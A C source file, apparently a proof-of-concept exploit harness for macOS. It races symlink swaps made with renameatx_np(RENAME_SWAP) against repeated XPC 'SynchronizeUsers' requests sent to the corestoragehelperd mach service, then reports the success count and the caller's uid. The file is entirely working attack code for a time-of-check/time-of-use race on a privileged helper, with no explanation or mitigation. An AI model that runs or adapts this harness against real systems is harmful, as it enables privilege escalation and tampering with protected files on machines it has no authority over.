#include <dispatch/dispatch.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/attr.h>
#include <time.h>
#include <unistd.h>
#include <xpc/xpc.h>

struct race_state {
    const char *current;
    const char *alternate;
    uint64_t delay_ns;
    atomic_bool stop;
    atomic_uint_fast64_t swaps;
};

static void
sleep_ns(uint64_t delay_ns)
{
    if (delay_ns == 0)
        return;

    struct timespec delay = {
        .tv_sec = (time_t)(delay_ns / 1000000000ULL),
        .tv_nsec = (long)(delay_ns % 1000000000ULL),
    };
    nanosleep(&delay, NULL);
}

static void *
swap_thread(void *opaque)
{
    struct race_state *state = opaque;

    while (!atomic_load_explicit(&state->stop, memory_order_relaxed)) {
        if (renameatx_np(AT_FDCWD, state->current, AT_FDCWD,
                         state->alternate, RENAME_SWAP) != 0) {
            perror("renameatx_np(RENAME_SWAP)");
            atomic_store(&state->stop, true);
            break;
        }
        atomic_fetch_add_explicit(&state->swaps, 1, memory_order_relaxed);
        sleep_ns(state->delay_ns);
    }
    return NULL;
}

int
main(int argc, char **argv)
{
    if (argc != 6) {
        fprintf(stderr,
            "usage: %s link-path target-a target-b attempts swap-delay-ns\n",
            argv[0]);
        return 64;
    }

    const char *current = argv[1];
    const char *target_a = argv[2];
    const char *target_b = argv[3];
    char *end = NULL;
    unsigned long attempts = strtoul(argv[4], &end, 0);
    if (!end || *end != '\0' || attempts == 0) {
        fprintf(stderr, "invalid attempt count: %s\n", argv[4]);
        return 64;
    }
    uint64_t delay_ns = strtoull(argv[5], &end, 0);
    if (!end || *end != '\0') {
        fprintf(stderr, "invalid delay: %s\n", argv[5]);
        return 64;
    }

    size_t alternate_len = strlen(current) + sizeof(".alternate");
    char *alternate = malloc(alternate_len);
    if (!alternate)
        return 1;
    snprintf(alternate, alternate_len, "%s.alternate", current);

    unlink(current);
    unlink(alternate);
    if (symlink(target_a, current) != 0 || symlink(target_b, alternate) != 0) {
        perror("symlink");
        return 1;
    }

    xpc_connection_t connection = xpc_connection_create_mach_service(
        "com.apple.corestorage.corestoragehelperd", NULL, 0);
    if (!connection) {
        fprintf(stderr, "connection creation failed\n");
        return 1;
    }
    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
        if (xpc_get_type(event) == XPC_TYPE_ERROR) {
            const char *description = xpc_dictionary_get_string(
                event, XPC_ERROR_KEY_DESCRIPTION);
            fprintf(stderr, "connection event: %s\n",
                description ? description : "unknown error");
        }
    });
    xpc_connection_resume(connection);

    struct race_state state = {
        .current = current,
        .alternate = alternate,
        .delay_ns = delay_ns,
    };
    atomic_init(&state.stop, false);
    atomic_init(&state.swaps, 0);

    pthread_t thread;
    if (pthread_create(&thread, NULL, swap_thread, &state) != 0) {
        perror("pthread_create");
        return 1;
    }

    unsigned long success = 0;
    unsigned long failure = 0;
    for (unsigned long i = 0; i < attempts && !atomic_load(&state.stop); i++) {
        xpc_object_t request = xpc_dictionary_create(NULL, NULL, 0);
        xpc_dictionary_set_string(request, "op", "SynchronizeUsers");
        xpc_dictionary_set_string(request, "path", current);
        xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
            connection, request);
        if (reply && xpc_get_type(reply) == XPC_TYPE_DICTIONARY &&
            xpc_dictionary_get_bool(reply, "status"))
            success++;
        else
            failure++;
        if (reply)
            xpc_release(reply);
        xpc_release(request);
    }

    atomic_store(&state.stop, true);
    pthread_join(thread, NULL);
    printf("uid=%u attempts=%lu success=%lu failure=%lu swaps=%llu "
           "delay_ns=%llu\n",
        getuid(), attempts, success, failure,
        (unsigned long long)atomic_load(&state.swaps),
        (unsigned long long)delay_ns);
    return failure ? 2 : 0;
}
